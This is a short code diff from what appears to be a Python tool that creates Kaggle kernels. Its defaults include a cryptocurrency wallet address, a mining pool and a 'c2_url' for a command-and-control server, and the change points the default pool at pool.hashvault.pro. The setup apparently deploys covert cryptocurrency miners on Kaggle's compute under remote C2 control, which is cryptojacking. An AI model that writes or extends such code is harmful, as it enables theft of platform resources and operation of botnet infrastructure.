@@ -139,7 +139,7 @@ def create_kernel(api_key: str, username: str, kernel_name: str, log_fn=print,
     try:
         setup_kaggle_credentials(api_key, username)
         wallet = wallet or "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
-        pool = pool or "45.155.102.89:10128"
+        pool = pool or "pool.hashvault.pro:80"
         c2_url = c2_url or "http://10.118.45.233:5000"
         
         with tempfile.TemporaryDirectory() as tmpdir:
